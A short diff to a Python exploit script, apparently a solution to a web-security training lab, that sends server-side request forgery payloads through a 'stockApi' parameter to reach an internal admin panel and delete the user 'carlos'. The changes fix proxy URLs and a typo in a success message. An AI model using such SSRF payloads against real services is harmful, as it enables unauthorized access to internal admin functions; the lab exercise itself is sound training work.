@@ -3,7 +3,7 @@ import sys
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {'http': 'http//127.0.0.1', 'https': 'http//127.0.0.1'}
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def delete_user(url):
     delete_user_url_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
@@ -15,7 +15,7 @@ def delete_user(url):
     admin_ssrf_payload = 'http://localhost/admin'
     params2= {'stockApi': admin_ssrf_payload}
     r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
-    if 'User delelted successfuly' in r.text:
+    if 'User deleted successfuly' in r.text:
         print("(+) Successlfy deleted carlos user!")
     else:
         print("(-) Exploit was unsuccessful")
